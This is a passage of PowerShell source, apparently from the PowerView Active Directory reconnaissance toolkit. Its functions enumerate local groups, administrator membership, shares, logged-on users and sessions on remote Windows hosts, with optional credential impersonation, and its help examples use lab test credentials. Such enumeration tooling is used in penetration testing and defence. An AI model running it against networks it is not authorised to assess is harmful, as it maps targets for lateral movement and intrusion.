domain or a specified domain/domain controller using Get-DomainGPO.

.PARAMETER Domain

The domain to query for default policies, defaults to the current domain.

.PARAMETER Policy

Extract 'Domain', 'DC' (domain controller) policies, or 'All' for all policies.
Otherwise queries for the particular GPO name or GUID.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainPolicyData

Returns the default domain policy for the current domain.

.EXAMPLE

Get-DomainPolicyData -Domain dev.testlab.local

Returns the default domain policy for the dev.testlab.local domain.

.EXAMPLE

Get-DomainGPO | Get-DomainPolicy

Parses any GptTmpl.infs found for any policies in the current domain.

.EXAMPLE

Get-DomainPolicyData -Policy DC -Domain dev.testlab.local

Returns the policy for the dev.testlab.local domain controller.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainPolicyData -Credential $Cred

.OUTPUTS

Hashtable

Ouputs a hashtable representing the parsed GptTmpl.inf file.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Source', 'Name')]
        [String]
        $Policy = 'Domain',

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        $ConvertArguments = @{}
        if ($PSBoundParameters['Server']) { $ConvertArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $ConvertArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $SearcherArguments['Domain'] = $Domain
            $ConvertArguments['Domain'] = $Domain
        }

        if ($Policy -eq 'All') {
            $SearcherArguments['Identity'] = '*'
        }
        elseif ($Policy -eq 'Domain') {
            $SearcherArguments['Identity'] = '{31B2F340-016D-11D2-945F-00C04FB984F9}'
        }
        elseif (($Policy -eq 'DomainController') -or ($Policy -eq 'DC')) {
            $SearcherArguments['Identity'] = '{6AC1786C-016F-11D2-945F-00C04FB984F9}'
        }
        else {
            $SearcherArguments['Identity'] = $Policy
        }

        $GPOResults = Get-DomainGPO @SearcherArguments

        ForEach ($GPO in $GPOResults) {
            # grab the GptTmpl.inf file and parse it
            $GptTmplPath = $GPO.gpcfilesyspath + "\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"

            $ParseArgs =  @{
                'GptTmplPath' = $GptTmplPath
                'OutputObject' = $True
            }
            if ($PSBoundParameters['Credential']) { $ParseArgs['Credential'] = $Credential }

            # parse the GptTmpl.inf
            Get-GptTmpl @ParseArgs | ForEach-Object {
                $_ | Add-Member Noteproperty 'GPOName' $GPO.name
                $_ | Add-Member Noteproperty 'GPODisplayName' $GPO.displayname
                $_
            }
        }
    }
}


########################################################
#
# Functions that enumerate a single host, either through
# WinNT, WMI, remote registry, or API calls
# (with PSReflect).
#
########################################################

function Get-NetLocalGroup {
<#
.SYNOPSIS

Enumerates the local groups on the local (or remote) machine.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect  

.DESCRIPTION

This function will enumerate the names and descriptions for the
local groups on the current, or remote, machine. By default, the Win32 API
call NetLocalGroupEnum will be used (for speed). Specifying "-Method WinNT"
causes the WinNT service provider to be used instead, which returns group
SIDs along with the group names and descriptions/comments.

.PARAMETER ComputerName

Specifies the hostname to query for sessions (also accepts IP addresses).
Defaults to the localhost.

.PARAMETER Method

The collection method to use, defaults to 'API', also accepts 'WinNT'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to a remote machine. Only applicable with "-Method WinNT".

.EXAMPLE

Get-NetLocalGroup

ComputerName                  GroupName                     Comment
------------                  ---------                     -------
WINDOWS1                      Administrators                Administrators have comple...
WINDOWS1                      Backup Operators              Backup Operators can overr...
WINDOWS1                      Cryptographic Operators       Members are authorized to ...
...

.EXAMPLE

Get-NetLocalGroup -Method Winnt

ComputerName           GroupName              GroupSID              Comment
------------           ---------              --------              -------
WINDOWS1               Administrators         S-1-5-32-544          Administrators hav...
WINDOWS1               Backup Operators       S-1-5-32-551          Backup Operators c...
WINDOWS1               Cryptographic Opera... S-1-5-32-569          Members are author...
...

.EXAMPLE

Get-NetLocalGroup -ComputerName primary.testlab.local

ComputerName                  GroupName                     Comment
------------                  ---------                     -------
primary.testlab.local         Administrators                Administrators have comple...
primary.testlab.local         Users                         Users are prevented from m...
primary.testlab.local         Guests                        Guests have the same acces...
primary.testlab.local         Print Operators               Members can administer dom...
primary.testlab.local         Backup Operators              Backup Operators can overr...

.OUTPUTS

PowerView.LocalGroup.API

Custom PSObject with translated group property fields from API results.

PowerView.LocalGroup.WinNT

Custom PSObject with translated group property fields from WinNT results.

.LINK

https://msdn.microsoft.com/en-us/library/windows/desktop/aa370440(v=vs.85).aspx
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroup.API')]
    [OutputType('PowerView.LocalGroup.WinNT')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $Method = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            if ($Method -eq 'API') {
                # if we're using the Netapi32 NetLocalGroupEnum API call to get the local group information

                # arguments for NetLocalGroupEnum
                $QueryLevel = 1
                $PtrInfo = [IntPtr]::Zero
                $EntriesRead = 0
                $TotalRead = 0
                $ResumeHandle = 0

                # get the local user information
                $Result = $Netapi32::NetLocalGroupEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

                # locate the offset of the initial intPtr
                $Offset = $PtrInfo.ToInt64()

                # 0 = success
                if (($Result -eq 0) -and ($Offset -gt 0)) {

                    # Work out how much to increment the pointer by finding out the size of the structure
                    $Increment = $LOCALGROUP_INFO_1::GetSize()

                    # parse all the result structures
                    for ($i = 0; ($i -lt $EntriesRead); $i++) {
                        # create a new int ptr at the given offset and cast the pointer as our result structure
                        $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                        $Info = $NewIntPtr -as $LOCALGROUP_INFO_1

                        $Offset = $NewIntPtr.ToInt64()
                        $Offset += $Increment

                        $LocalGroup = New-Object PSObject
                        $LocalGroup | Add-Member Noteproperty 'ComputerName' $Computer
                        $LocalGroup | Add-Member Noteproperty 'GroupName' $Info.lgrpi1_name
                        $LocalGroup | Add-Member Noteproperty 'Comment' $Info.lgrpi1_comment
                        $LocalGroup.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.API')
                        $LocalGroup
                    }
                    # free up the result buffer
                    $Null = $Netapi32::NetApiBufferFree($PtrInfo)
                }
                else {
                    Write-Verbose "[Get-NetLocalGroup] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
                }
            }
            else {
                # otherwise we're using the WinNT service provider
                $ComputerProvider = [ADSI]"WinNT://$Computer,computer"

                $ComputerProvider.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | ForEach-Object {
                    $LocalGroup = ([ADSI]$_)
                    $Group = New-Object PSObject
                    $Group | Add-Member Noteproperty 'ComputerName' $Computer
                    $Group | Add-Member Noteproperty 'GroupName' ($LocalGroup.InvokeGet('Name'))
                    $Group | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($LocalGroup.InvokeGet('objectsid'),0)).Value)
                    $Group | Add-Member Noteproperty 'Comment' ($LocalGroup.InvokeGet('Description'))
                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.WinNT')
                    $Group
                }
            }
        }
    }
    
    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetLocalGroupMember {
<#
.SYNOPSIS

Enumerates members of a specific local group on the local (or remote) machine.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Convert-ADName  

.DESCRIPTION

This function will enumerate the members of a specified local group  on the
current, or remote, machine. By default, the Win32 API call NetLocalGroupGetMembers
will be used (for speed). Specifying "-Method WinNT" causes the WinNT service provider
to be used instead, which returns a larger amount of information.

.PARAMETER ComputerName

Specifies the hostname to query for sessions (also accepts IP addresses).
Defaults to the localhost.

.PARAMETER GroupName

The local group name to query for users. If not given, it defaults to "Administrators".

.PARAMETER Method

The collection method to use, defaults to 'API', also accepts 'WinNT'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to a remote machine. Only applicable with "-Method WinNT".

.EXAMPLE

Get-NetLocalGroupMember | ft

ComputerName   GroupName      MemberName     SID                   IsGroup       IsDomain
------------   ---------      ----------     ---                   -------       --------
WINDOWS1       Administrators WINDOWS1\Ad... S-1-5-21-25...          False          False
WINDOWS1       Administrators WINDOWS1\lo... S-1-5-21-25...          False          False
WINDOWS1       Administrators TESTLAB\Dom... S-1-5-21-89...           True           True
WINDOWS1       Administrators TESTLAB\har... S-1-5-21-89...          False           True

.EXAMPLE

Get-NetLocalGroupMember -Method winnt | ft

ComputerName   GroupName      MemberName     SID                   IsGroup       IsDomain
------------   ---------      ----------     ---                   -------       --------
WINDOWS1       Administrators WINDOWS1\Ad... S-1-5-21-25...          False          False
WINDOWS1       Administrators WINDOWS1\lo... S-1-5-21-25...          False          False
WINDOWS1       Administrators TESTLAB\Dom... S-1-5-21-89...           True           True
WINDOWS1       Administrators TESTLAB\har... S-1-5-21-89...          False           True

.EXAMPLE

Get-NetLocalGroup | Get-NetLocalGroupMember | ft

ComputerName   GroupName      MemberName     SID                   IsGroup       IsDomain
------------   ---------      ----------     ---                   -------       --------
WINDOWS1       Administrators WINDOWS1\Ad... S-1-5-21-25...          False          False
WINDOWS1       Administrators WINDOWS1\lo... S-1-5-21-25...          False          False
WINDOWS1       Administrators TESTLAB\Dom... S-1-5-21-89...           True           True
WINDOWS1       Administrators TESTLAB\har... S-1-5-21-89...          False           True
WINDOWS1       Guests         WINDOWS1\Guest S-1-5-21-25...          False          False
WINDOWS1       IIS_IUSRS      NT AUTHORIT... S-1-5-17                False          False
WINDOWS1       Users          NT AUTHORIT... S-1-5-4                 False          False
WINDOWS1       Users          NT AUTHORIT... S-1-5-11                False          False
WINDOWS1       Users          WINDOWS1\lo... S-1-5-21-25...          False        UNKNOWN
WINDOWS1       Users          TESTLAB\Dom... S-1-5-21-89...           True        UNKNOWN

.EXAMPLE

Get-NetLocalGroupMember -ComputerName primary.testlab.local | ft

ComputerName   GroupName      MemberName     SID                   IsGroup       IsDomain
------------   ---------      ----------     ---                   -------       --------
primary.tes... Administrators TESTLAB\Adm... S-1-5-21-89...          False          False
primary.tes... Administrators TESTLAB\loc... S-1-5-21-89...          False          False
primary.tes... Administrators TESTLAB\Ent... S-1-5-21-89...           True          False
primary.tes... Administrators TESTLAB\Dom... S-1-5-21-89...           True          False

.OUTPUTS

PowerView.LocalGroupMember.API

Custom PSObject with translated group property fields from API results.

PowerView.LocalGroupMember.WinNT

Custom PSObject with translated group property fields from WinNT results.

.LINK

http://stackoverflow.com/questions/21288220/get-all-local-members-and-groups-displayed-together
http://msdn.microsoft.com/en-us/library/aa772211(VS.85).aspx
https://msdn.microsoft.com/en-us/library/windows/desktop/aa370601(v=vs.85).aspx
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $GroupName = 'Administrators',

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $Method = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            if ($Method -eq 'API') {
                # if we're using the Netapi32 NetLocalGroupGetMembers API call to get the local group information

                # arguments for NetLocalGroupGetMembers
                $QueryLevel = 2
                $PtrInfo = [IntPtr]::Zero
                $EntriesRead = 0
                $TotalRead = 0
                $ResumeHandle = 0

                # get the local user information
                $Result = $Netapi32::NetLocalGroupGetMembers($Computer, $GroupName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

                # locate the offset of the initial intPtr
                $Offset = $PtrInfo.ToInt64()

                $Members = @()

                # 0 = success
                if (($Result -eq 0) -and ($Offset -gt 0)) {

                    # Work out how much to increment the pointer by finding out the size of the structure
                    $Increment = $LOCALGROUP_MEMBERS_INFO_2::GetSize()

                    # parse all the result structures
                    for ($i = 0; ($i -lt $EntriesRead); $i++) {
                        # create a new int ptr at the given offset and cast the pointer as our result structure
                        $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                        $Info = $NewIntPtr -as $LOCALGROUP_MEMBERS_INFO_2

                        $Offset = $NewIntPtr.ToInt64()
                        $Offset += $Increment

                        $SidString = ''
                        $Result2 = $Advapi32::ConvertSidToStringSid($Info.lgrmi2_sid, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if ($Result2 -eq 0) {
                            Write-Verbose "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                        }
                        else {
                            $Member = New-Object PSObject
                            $Member | Add-Member Noteproperty 'ComputerName' $Computer
                            $Member | Add-Member Noteproperty 'GroupName' $GroupName
                            $Member | Add-Member Noteproperty 'MemberName' $Info.lgrmi2_domainandname
                            $Member | Add-Member Noteproperty 'SID' $SidString
                            $IsGroup = $($Info.lgrmi2_sidusage -eq 'SidTypeGroup')
                            $Member | Add-Member Noteproperty 'IsGroup' $IsGroup
                            $Member.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroupMember.API')
                            $Members += $Member
                        }
                    }

                    # free up the result buffer
                    $Null = $Netapi32::NetApiBufferFree($PtrInfo)

                    # try to extract out the machine SID by using the -500 account as a reference
                    $MachineSid = $Members | Where-Object {$_.SID -match '.*-500' -or ($_.SID -match '.*-501')} | Select-Object -Expand SID
                    if ($MachineSid) {
                        $MachineSid = $MachineSid.Substring(0, $MachineSid.LastIndexOf('-'))

                        $Members | ForEach-Object {
                            if ($_.SID -match $MachineSid) {
                                $_ | Add-Member Noteproperty 'IsDomain' $False
                            }
                            else {
                                $_ | Add-Member Noteproperty 'IsDomain' $True
                            }
                        }
                    }
                    else {
                        $Members | ForEach-Object {
                            if ($_.SID -notmatch 'S-1-5-21') {
                                $_ | Add-Member Noteproperty 'IsDomain' $False
                            }
                            else {
                                $_ | Add-Member Noteproperty 'IsDomain' 'UNKNOWN'
                            }
                        }
                    }
                    $Members
                }
                else {
                    Write-Verbose "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
                }
            }
            else {
                # otherwise we're using the WinNT service provider
                try {
                    $GroupProvider = [ADSI]"WinNT://$Computer/$GroupName,group"

                    $GroupProvider.psbase.Invoke('Members') | ForEach-Object {

                        $Member = New-Object PSObject
                        $Member | Add-Member Noteproperty 'ComputerName' $Computer
                        $Member | Add-Member Noteproperty 'GroupName' $GroupName

                        $LocalUser = ([ADSI]$_)
                        $AdsPath = $LocalUser.InvokeGet('AdsPath').Replace('WinNT://', '')
                        $IsGroup = ($LocalUser.SchemaClassName -like 'group')

                        if(([regex]::Matches($AdsPath, '/')).count -eq 1) {
                            # DOMAIN\user
                            $MemberIsDomain = $True
                            $Name = $AdsPath.Replace('/', '\')
                        }
                        else {
                            # DOMAIN\machine\user
                            $MemberIsDomain = $False
                            $Name = $AdsPath.Substring($AdsPath.IndexOf('/')+1).Replace('/', '\')
                        }

                        $Member | Add-Member Noteproperty 'AccountName' $Name
                        $Member | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($LocalUser.InvokeGet('ObjectSID'),0)).Value)
                        $Member | Add-Member Noteproperty 'IsGroup' $IsGroup
                        $Member | Add-Member Noteproperty 'IsDomain' $MemberIsDomain

                        # if ($MemberIsDomain) {
                        #     # translate the binary sid to a string
                        #     $Member | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($LocalUser.InvokeGet('ObjectSID'),0)).Value)
                        #     $Member | Add-Member Noteproperty 'Description' ''
                        #     $Member | Add-Member Noteproperty 'Disabled' ''

                        #     if ($IsGroup) {
                        #         $Member | Add-Member Noteproperty 'LastLogin' ''
                        #     }
                        #     else {
                        #         try {
                        #             $Member | Add-Member Noteproperty 'LastLogin' $LocalUser.InvokeGet('LastLogin')
                        #         }
                        #         catch {
                        #             $Member | Add-Member Noteproperty 'LastLogin' ''
                        #         }
                        #     }
                        #     $Member | Add-Member Noteproperty 'PwdLastSet' ''
                        #     $Member | Add-Member Noteproperty 'PwdExpired' ''
                        #     $Member | Add-Member Noteproperty 'UserFlags' ''
                        # }
                        # else {
                        #     # translate the binary sid to a string
                        #     $Member | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($LocalUser.InvokeGet('ObjectSID'),0)).Value)
                        #     $Member | Add-Member Noteproperty 'Description' ($LocalUser.Description)

                        #     if ($IsGroup) {
                        #         $Member | Add-Member Noteproperty 'PwdLastSet' ''
                        #         $Member | Add-Member Noteproperty 'PwdExpired' ''
                        #         $Member | Add-Member Noteproperty 'UserFlags' ''
                        #         $Member | Add-Member Noteproperty 'Disabled' ''
                        #         $Member | Add-Member Noteproperty 'LastLogin' ''
                        #     }
                        #     else {
                        #         $Member | Add-Member Noteproperty 'PwdLastSet' ( (Get-Date).AddSeconds(-$LocalUser.PasswordAge[0]))
                        #         $Member | Add-Member Noteproperty 'PwdExpired' ( $LocalUser.PasswordExpired[0] -eq '1')
                        #         $Member | Add-Member Noteproperty 'UserFlags' ( $LocalUser.UserFlags[0] )
                        #         # UAC flags of 0x2 mean the account is disabled
                        #         $Member | Add-Member Noteproperty 'Disabled' $(($LocalUser.UserFlags.value -band 2) -eq 2)
                        #         try {
                        #             $Member | Add-Member Noteproperty 'LastLogin' ( $LocalUser.LastLogin[0])
                        #         }
                        #         catch {
                        #             $Member | Add-Member Noteproperty 'LastLogin' ''
                        #         }
                        #     }
                        # }

                        $Member
                    }
                }
                catch {
                    Write-Verbose "[Get-NetLocalGroupMember] Error for $Computer : $_"
                }
            }
        }
    }
    
    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetShare {
<#
.SYNOPSIS

Returns open shares on the local (or a remote) machine.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function will execute the NetShareEnum Win32API call to query
a given host for open shares. This is a replacement for "net share \\hostname".

.PARAMETER ComputerName

Specifies the hostname to query for shares (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Get-NetShare

Returns active shares on the local host.

.EXAMPLE

Get-NetShare -ComputerName sqlserver

Returns active shares on the 'sqlserver' host

.EXAMPLE

Get-DomainComputer | Get-NetShare

Returns all shares for all computers in the domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-NetShare -ComputerName sqlserver -Credential $Cred

.OUTPUTS

PowerView.ShareInfo

A PSCustomObject representing a SHARE_INFO_1 structure, including
the name/type/remark for each share, with the ComputerName added.

.LINK

http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
#>

    [OutputType('PowerView.ShareInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # arguments for NetShareEnum
            $QueryLevel = 1
            $PtrInfo = [IntPtr]::Zero
            $EntriesRead = 0
            $TotalRead = 0
            $ResumeHandle = 0

            # get the raw share information
            $Result = $Netapi32::NetShareEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

            # locate the offset of the initial intPtr
            $Offset = $PtrInfo.ToInt64()

            # 0 = success
            if (($Result -eq 0) -and ($Offset -gt 0)) {

                # work out how much to increment the pointer by finding out the size of the structure
                $Increment = $SHARE_INFO_1::GetSize()

                # parse all the result structures
                for ($i = 0; ($i -lt $EntriesRead); $i++) {
                    # create a new int ptr at the given offset and cast the pointer as our result structure
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $SHARE_INFO_1

                    # return all the sections of the structure - have to do it this way for V2
                    $Share = $Info | Select-Object *
                    $Share | Add-Member Noteproperty 'ComputerName' $Computer
                    $Share.PSObject.TypeNames.Insert(0, 'PowerView.ShareInfo')
                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment
                    $Share
                }

                # free up the result buffer
                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                Write-Verbose "[Get-NetShare] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
            }
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetLoggedon {
<#
.SYNOPSIS

Returns users logged on the local (or a remote) machine.
Note: administrative rights needed for newer Windows OSes.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function will execute the NetWkstaUserEnum Win32API call to query
a given host for actively logged on users.

.PARAMETER ComputerName

Specifies the hostname to query for logged on users (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Get-NetLoggedon

Returns users actively logged onto the local host.

.EXAMPLE

Get-NetLoggedon -ComputerName sqlserver

Returns users actively logged onto the 'sqlserver' host.

.EXAMPLE

Get-DomainComputer | Get-NetLoggedon

Returns all logged on users for all computers in the domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-NetLoggedon -ComputerName sqlserver -Credential $Cred

.OUTPUTS

PowerView.LoggedOnUserInfo

A PSCustomObject representing a WKSTA_USER_INFO_1 structure, including
the UserName/LogonDomain/AuthDomains/LogonServer for each user, with the ComputerName added.

.LINK

http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
#>

    [OutputType('PowerView.LoggedOnUserInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # declare the reference variables
            $QueryLevel = 1
            $PtrInfo = [IntPtr]::Zero
            $EntriesRead = 0
            $TotalRead = 0
            $ResumeHandle = 0

            # get logged on user information
            $Result = $Netapi32::NetWkstaUserEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

            # locate the offset of the initial intPtr
            $Offset = $PtrInfo.ToInt64()

            # 0 = success
            if (($Result -eq 0) -and ($Offset -gt 0)) {

                # work out how much to increment the pointer by finding out the size of the structure
                $Increment = $WKSTA_USER_INFO_1::GetSize()

                # parse all the result structures
                for ($i = 0; ($i -lt $EntriesRead); $i++) {
                    # create a new int ptr at the given offset and cast the pointer as our result structure
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $WKSTA_USER_INFO_1

                    # return all the sections of the structure - have to do it this way for V2
                    $LoggedOn = $Info | Select-Object *
                    $LoggedOn | Add-Member Noteproperty 'ComputerName' $Computer
                    $LoggedOn.PSObject.TypeNames.Insert(0, 'PowerView.LoggedOnUserInfo')
                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment
                    $LoggedOn
                }

                # free up the result buffer
                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                Write-Verbose "[Get-NetLoggedon] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
            }
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetSession {
<#
.SYNOPSIS

Returns session information for the local (or a remote) machine.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function will execute the NetSessionEnum Win32API call to query
a given host for active sessions.

.PARAMETER ComputerName

Specifies the hostname to query for sessions (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Get-NetSession

Returns active sessions on the local host.

.EXAMPLE

Get-NetSession -ComputerName sqlserver

Returns active sessions on the 'sqlserver' host.

.EXAMPLE

Get-DomainController | Get-NetSession

Returns active sessions on all domain controllers.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-NetSession -ComputerName sqlserver -Credential $Cred

.OUTPUTS

PowerView.SessionInfo

A PSCustomObject representing a WKSTA_USER_INFO_1 structure, including
the CName/UserName/Time/IdleTime for each session, with the ComputerName added.

.LINK

http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
#>

    [OutputType('PowerView.SessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # arguments for NetSessionEnum
            $QueryLevel = 10
            $PtrInfo = [IntPtr]::Zero
            $EntriesRead = 0
            $TotalRead = 0
            $ResumeHandle = 0

            # get session information
            $Result = $Netapi32::NetSessionEnum($Computer, '', $UserName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

            # locate the offset of the initial intPtr
            $Offset = $PtrInfo.ToInt64()

            # 0 = success
            if (($Result -eq 0) -and ($Offset -gt 0)) {

                # work out how much to increment the pointer by finding out the size of the structure
                $Increment = $SESSION_INFO_10::GetSize()

                # parse all the result structures
                for ($i = 0; ($i -lt $EntriesRead); $i++) {
                    # create a new int ptr at the given offset and cast the pointer as our result structure
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
